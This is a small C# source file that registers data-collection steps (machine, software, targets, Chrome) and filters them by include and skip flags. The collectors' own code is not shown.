using Teste.Collect;

namespace Teste.Core;

internal sealed record Step(string Key, Action<Report> Collect);

internal static class Steps
{
    public static IEnumerable<Step> All(Logger log)
    {
        yield return new Step("machine", SystemCollector.Machine);
        yield return new Step("targets", TargetCollector.Collect);
        yield return new Step("software", SystemCollector.Software);
        yield return new Step("chrome", r => ChromeCollector.Collect(r, log));
    }

    public static bool Wanted(string key) =>
        (Flags.Only.Count == 0 || Flags.Only.Contains(key, StringComparer.OrdinalIgnoreCase))
        && !Flags.Skip.Contains(key, StringComparer.OrdinalIgnoreCase);
}